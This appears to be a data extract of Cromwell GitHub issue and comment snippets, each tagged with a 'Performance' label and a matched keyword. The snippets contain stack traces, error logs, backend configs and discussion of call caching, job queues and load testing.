|29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCachin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:152,cache,cache,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,4,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"Call-cache cannot be used if a Singularity mirror is used. So Singularity becomes useless in the WDL process, where both call-cache and container are needed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100,2,['cache'],['cache']
Performance,"CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ""gs:/; /broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; _dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Trace",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:1622,concurren,concurrent,1622,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,"CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```. Then I see:. ```; [ERROR] [05/01/2017 17:36:04.203] [cromwell-system-akka.dispatchers.engine-dispatcher-84] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow 5; 3e95ead-9026-4c13-89f9-f6c675214523 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:1:1 failed. JES error code 5. Message: 9: Failed to localize files: failed to copy the follow; ing files: ""gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam -> /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD; /DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A2; 5E-08.2.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-10A-01D-A25E-08.2.bam, command",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:2190,concurren,concurrent,2190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['concurren'],['concurrent']
Performance,"Callcaching fails on GCPBATCH but not on PAPIv2 when using a private docker image in gcr.io. ; Is this a missing feature or a bug? The documentation on the subject could go either way, depending on whether GCPBATCH is part of the other backends or a subset of the pipelines backend (https://cromwell.readthedocs.io/en/latest/cromwell_features/CallCaching/). ; I do not think this is a configuration error, since the same config works with PAPIv2 backend, but if it is, what configuration options would be necessary for configuring gcr.io authentication when using GCPBATCH?. Errors from cromwell logs when task is being callcached:; ```; cromwell_1 | 2024-01-11 11:09:38 pool-9-thread-9 INFO - Manifest request failed for docker manifest V2, falling back to OCI manifest. Image: DockerImageIdentifierWithoutHash(Some(eu.gcr.io),Some(project),image_name,tag); cromwell_1 | cromwell.docker.registryv2.DockerRegistryV2Abstract$Unauthorized: 401 Unauthorized {""errors"":[{""code"":""UNAUTHORIZED"",""message"":""You don't have the needed permissions to perform this operation, and you may have invalid credentials. To authenticate your request, follow the steps in: https://cloud.google.com/container-registry/docs/advanced-authentication""}]}; cromwell_1 | 	at cromwell.docker.registryv2.DockerRegistryV2Abstract.$anonfun$getDigestFromResponse$1(DockerRegistryV2Abstract.scala:321); cromwell_1 | 	at map @ fs2.internal.CompileScope.$anonfun$close$9(CompileScope.scala:246); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$6(CompileScope.scala:245); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$4(CompileScope.scala:244); cromwell_1 | 	at map @ fs2.internal.CompileScope.fs2$internal$CompileScope$$traverseError(CompileScope.scala:222); cromwell_1 | 	at flatMap @ fs2.internal.CompileScope.$anonfun$close$2(CompileScope.scala:242); cromwell_1 | 	at flatMap",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:1592,perform,perform,1592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['perform'],['perform']
Performance,"Can you elaborate on why you want the functionality described? It is possible that call caching will help, but be aware that Cromwell will only read from the cache when absolutely everything matches - hashes of input files, WDL workflow, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981:158,cache,cache,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981,1,['cache'],['cache']
Performance,"Can you upload the complete stack trace from the cromwell-log?. On Fri, Feb 14, 2020 at 9:29 AM pjongeneel <notifications@github.com> wrote:. > I have /mnt/efs on both batch nodes and cromwell server which is the; > mounted EFS.; >; > Then; > backend {; > // this configures the AWS Batch Backend for Cromwell; > default = ""AWSBATCH""; > providers {; > AWSBATCH {; > actor-factory =; > ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; > config {; > root = ""/mnt/efs/cromwell_execution""; > auth = ""default""; >; > numSubmitAttempts = 3; > numCreateDefinitionAttempts = 3; >; > default-runtime-attributes {; > queueArn: ""${BatchQueue}""; > }; >; > filesystems {; > local { auth = ""default"" }; > }; > }; > }; >; > }; > }; >; > And I always get this error:; > ERROR - AwsBatchAsyncBackendJobExecutionActor; > [UUID(8512304b)bioinfx.testjob:NA:1]: Error attempting to Execute; > java.util.NoSuchElementException: None.get; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/5070?email_source=notifications&email_token=ALILATR2AVXQXLFRQKER6W3RC3IIXA5CNFSM4IBORPI2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOELZZF7A#issuecomment-586388220>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/ALILATWPGUN66MUEOCVPYULRC3IIXANCNFSM4IBORPIQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586395015:623,queue,queueArn,623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586395015,1,['queue'],['queueArn']
Performance,Cannot perform operation: String + womLong(x) in config,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:7,perform,perform,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['perform'],['perform']
Performance,Capture a performance run for analysis later,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4106:10,perform,performance,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4106,1,['perform'],['performance']
Performance,Carbonite performance testing [BA-6245],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5473:10,perform,performance,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5473,1,['perform'],['performance']
Performance,Catch namespace load throwables Closes #2066,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2098:16,load,load,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2098,1,['load'],['load']
Performance,Catch other message type when cache copy fails,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3996:30,cache,cache,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3996,1,['cache'],['cache']
Performance,"Centaur testing appears to fail when too many tests run concurrently due to:; ```; java.lang.RuntimeException: AwsBatchAsyncBackendJobExecutionActor failed and didn't catch its exception.; 	at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrElse(StandardSyncExecutionActor.scala:183); 	at cromwell.backend.standard.StandardSyncExecutionActor$$anonfun$jobFailingDecider$1.applyOrElse(StandardSyncExecutionActor.scala:180); 	at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:298); [...]; Caused by: software.amazon.awssdk.services.batch.model.BatchException: Too Many Requests (Service: Batch, Status Code: 429, Request ID: 932e695f-5a4b-11e9-abf3-d5638efd51d6); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); [...]; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4816:56,concurren,concurrently,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4816,1,['concurren'],['concurrently']
Performance,Checking call cache time is suspiciously long on large scatters,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2172:14,cache,cache,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2172,1,['cache'],['cache']
Performance,Clear cache from optional associated workflow when rerunning after Centaur error [CROM-6807],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6654:6,cache,cache,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654,1,['cache'],['cache']
Performance,"Closes #4557 . - Adds a configurable value `token-log-interval-seconds` in the `hog-safety` stanza.; - Logs when a hog group is at its limit (no more than once per `token-log-interval-seconds` seconds per hog group); - Logs when a backend has used all tokens (no more than once per `token-log-interval-seconds` seconds per backend); - Logs the current status of the Cromwell token queues (no more than once per `token-log-interval-seconds` seconds). Sample log message:; ```; Token Dispenser: The backend Local is starting too many jobs. New jobs are being limited.; ```. Sample queue status output:; ```; ""Token Dispenser state"": {; ""queues"": [{; ""token type"": ""BACKEND=Local/TOKENLIMIT=Some(10)/HOGFACTOR=5"",; ""queue state"": {; ""queue"": [{; ""name"": ""4a458483"",; ""queue size"": 2; }, {; ""name"": ""b106f1f4"",; ""queue size"": 2; }],; ""pool"": {; ""hog groups"": [{; ""hog group"": ""4a458483"",; ""used"": 2,; ""available"": false; }, {; ""hog group"": ""b106f1f4"",; ""used"": 2,; ""available"": false; }],; ""hog limit"": 2,; ""capacity"": 10,; ""leased"": 4; }; }; }],; ""pointer"": 0,; ""total token assignments"": 4; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4567:381,queue,queues,381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4567,7,['queue'],"['queue', 'queues']"
Performance,"Closes https://broadworkbench.atlassian.net/browse/CROM-6603.; Instead of storing a `hitNumber` (which in fact is an offset), now it explicitly stores cache ids that were already seen.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6072:151,cache,cache,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072,1,['cache'],['cache']
Performance,"Closing as a duplicate of newer, more ambition, scalability tickets",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1279#issuecomment-276488183:48,scalab,scalability,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1279#issuecomment-276488183,1,['scalab'],['scalability']
Performance,"Closing as not-very-compelling. But maybe we'll hit something similar during the ""scalability"" work",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/618#issuecomment-254319626:82,scalab,scalability,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/618#issuecomment-254319626,1,['scalab'],['scalability']
Performance,Closing for now. Will re-open once I sort out the call cache diff endpoint,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5146#issuecomment-525871365:55,cache,cache,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5146#issuecomment-525871365,1,['cache'],['cache']
Performance,Closing this one. We use the status endpoint in our scaling tests so we can now regression test the responsiveness vs scalability too,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-254301199:118,scalab,scalability,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-254301199,2,['scalab'],['scalability']
Performance,"Code=0. Event type=STATUS_CHANGED; time=seconds: 1712173989, nanos: 937816549; taskState=STATE_UNSPECIFIED; description=Job state is set from RUNNING to SUCCEEDED for job projects/392615380452/locations/us-south1/jobs/job-ba81bad8-82e9-4d95-8fc0-04dfbbd746da.; taskExecution.exitCode=0; ```. What we define as execution events:. ```; ExecutionEvent(Job state is set from QUEUED to SCHEDULED for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:10:01.704137839Z,None); ExecutionEvent(Job state is set from SCHEDULED to RUNNING for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:11:30.631264449Z,None); ExecutionEvent(Job state is set from RUNNING to SUCCEEDED for job projects/392615380452/locations/us-south1/jobs/job-321db1bc-9a68-4171-aa2a-46885d781656.,2024-04-03T20:12:16.898798407Z,None); ```. </details>; </details>. ## Load test results. We have executed many load tests, this is the latest one involving 14k jobs. Data / Backend | Batch with Mysql | PAPIv2 with Mysql; ------------- | -------------|---------; Jobs | 14400 | 14400; Execution time | 20936 seconds | 24451 seconds. Overall, all our tests indicate that Batch finishes executing the jobs faster than PAPIv2. <details>; <summary>Load tests settings</summary>. We have ran Cromwell in server mode with the following settings:. - request-timeout: 10m; - idle-timeout: 10m; - job-rate-control: jobs = 20, per = 10 seconds; - max-workflow-launch-count: 50; - new-workflow-poll-rate: 1; - database: MySQL; - virtual-private-cloud setup; - maximum-polling-interval: 600s; - localization-attempts: 3; - google.auth: service account; - request-workers: 3; - concurrent-job-limit: 14400. JVM Options:; - `-Xms512m -Xmx64g`. **NOTE**: Initially we found a bottleneck on Batch but Google enabled an experimental settings to schedule many jobs concurrently which reduced the total execution time. Server capacity (from Google",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412:5395,load,load,5395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412,1,['load'],['load']
Performance,Comparer for performance metadata JSON files [BA-6350],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5491:13,perform,performance,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5491,1,['perform'],['performance']
Performance,Concurrent Job Limits,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1490:0,Concurren,Concurrent,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1490,1,['Concurren'],['Concurrent']
Performance,Config option to disable copying of outputs on cache hit for JES,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2347:47,cache,cache,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2347,1,['cache'],['cache']
Performance,"ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int threads = 1; String memory = ""2g""; String dx_timeout; """"""; submit = """"""; sbatch; --account <account>; --partition ind-shared; --nodes 1; --job-name=${job_name}-%j; # --output=logs/{job_name}/$j.out; 	 -o ${out} -e ${err} ; --mail-type FAIL --mail-user <email-address>; --ntasks-per-node=${threads}; --mem=${memory}; --time=${dx_timeout}; --parsable; --chdir ${cwd}; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }}; ```. Here's the log printed to the terminal. Notice the jump from [2022-12-15 21:15:03,84] to [2022-12-15 21:22:59,01]; ```; $ java -Dconfig.file=workflow/cromwell.conf -jar utilities/cromwell-84.jar run workflow/expanse_workflow.wdl; [2022-12-15 21:14:44,99] [info] Running with database db.url =; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3. [2022-12-15 21:14:45,71] [info] dataFileCache open start; [2022-12-15 21:14:45,74] [info] dataFileCache open end; [2022-12-15 21:14:46,59] [info] checkpointClose start; [2022-12-15 21:14:46,59] [info] checkpointClose synched; [2022-12-15 21:14:46,71] [info] checkpointClose script done; [2022-12-15 21:14:46,71] [info] dataFileCache commit start; [2022-12-15 21:14:47,14] [info] dataFileCache commit end; [2022-12-15 21:14:47,20] [info] checkpointClose end; [2022-12-15 21:14:47,37] [info] Checkpoint start; [2022-12-15 21:14:47,37] [info] checkpointClose start; [2022-12-15 21:14:47,37] [info] checkpointClose synched; [2022-12-15 21:14:47,44] [info] checkpointClose script done; [2022-12-15 21:14:47,44] [info] dataFileCache commit start; [2022-12-15 21:14:47,45] [info] dataFileCache commit end; [2022-12-15 21:14:47,48] [info] checkpoin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:3261,cache,cached,3261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cached']
Performance,ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowInitializationActor.scala:146); at akka.actor.Actor.aroundReceive(Actor.scala:539); at akka.actor.Actor.aroundReceive$(Actor.scala:537); at cromwell.backend.standard.StandardInitializationActor.aroundReceive(StandardInitializationActor.scala:44); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); at akka.actor.ActorCell.invoke(ActorCell.scala:581); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); at akka.dispatch.Mailbox.run(Mailbox.scala:229); at akka.dispatch.Mailbox.exec(Mailbox.scala:241); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:5400,perform,performActionThenRespond,5400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['perform'],['performActionThenRespond']
Performance,Configurable junk metadata stream (for throughput testing!) [BA-6417],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5506:39,throughput,throughput,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5506,1,['throughput'],['throughput']
Performance,"Consolidates GCS localizations and delocalizations into one Action each. Speeds up the `lots_of_inputs` Centaur test from more than 70 minutes to about 20 minutes. This PR creates a localization script that groups localizations by source bucket, stages the localization script to GCS, then localizes the localization script to the node and runs it. This PR does not:. * Attempt any gsutil optimizations in copying.; * Consolidate localization or delocalization on other PAPI v2 supported input types: HTTP, DRS or SRA. These other input types may require separate localization script executions since at least some of them (DRS and SRA) will likely require different Docker images to actually run their localizations.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5091:389,optimiz,optimizations,389,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5091,1,['optimiz'],['optimizations']
Performance,"Contradicting what I said in standup today, the performant rewrites of the labels query actually _*are*_ using the new non-unique key+value index I created on `CUSTOM_LABEL_ENTRY` (see the fourth row of the `EXPLAIN` above referencing `IDX_KEY_VALUE` as its `key`). I confirmed that without that index performance reverts to being terrible. The version of the query generated by Slick doesn't use the index and still performs terribly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459406199:48,perform,performant,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459406199,3,['perform'],"['performance', 'performant', 'performs']"
Performance,"Cool thanks. Like I said it's be a couple of days before I can look at what, if anything that affected. When I do I'll look at the profiler again but it's pretty likely that we found a, not the, bottleneck",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496229:195,bottleneck,bottleneck,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496229,1,['bottleneck'],['bottleneck']
Performance,Cool!. Have you done any load/performance testing to get before and after numbers? If not let's chat as pet of this process,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1831#issuecomment-271616503:25,load,load,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1831#issuecomment-271616503,2,"['load', 'perform']","['load', 'performance']"
Performance,"Copying chat log below:. ---. dshiga [4:46 PM]; hi @kshakir, we're seeing a lot of workflows that have been stuck in submitted status for the past ~45 minutes. is something wrong in caas?; for example this workflow is stuck: 8de76a93-6b66-4c29-a2fe-31e6cd1f969e. kshakir [4:48 PM]; ```; Workflow 8de76a93-6b66-4c29-a2fe-31e6cd1f969e in state Running and restarted = false cannot be started and should not have been fetched.; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.engine.workflow.workflowstore.SqlWorkflowStore.$anonfun$fetchStartableWorkflows$1(SqlWorkflowStore.scala:57); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; :hmmm:. chrisl [4:50 P",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3673:823,concurren,concurrent,823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3673,3,['concurren'],['concurrent']
Performance,"Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 